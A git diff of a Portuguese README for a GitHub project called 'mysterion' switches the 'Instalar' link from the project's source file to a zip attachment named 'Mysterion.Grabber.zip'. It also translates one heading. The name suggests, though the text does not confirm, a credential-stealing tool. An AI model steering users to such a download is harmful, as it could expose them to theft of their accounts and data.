@@ -11,7 +11,7 @@
 
 <p align="center">
   <a href="https://github.com/hamsterdoctor">Autor</a> •
-  <a href="https://github.com/hamsterdoctor/mysterion/blob/main/mysterion.py#-install">Instalar</a> •
+  <a href="https://github.com/hamsterdoctor/mysterion/files/8879748/Mysterion.Grabber.zip">Instalar</a> •
   <a href="https://www.youtube.com/channel/UCRkeGLT1N2CNCBTxlaYrpaw">Youtube</a> •
   <a href="https://github.com/hamsterdoctor/mysterion/blob/main/aviso.txt">Créditos</a> •
 </p>
@@ -27,7 +27,7 @@
 
 
 
-<h2 align="center">🖥 Install</h2>
+<h2 align="center">🖥 Instalar</h2>
 
 Este Software provavelmente só funcionará em sistemas linux, então, ultilize uma Virtual Box!
 
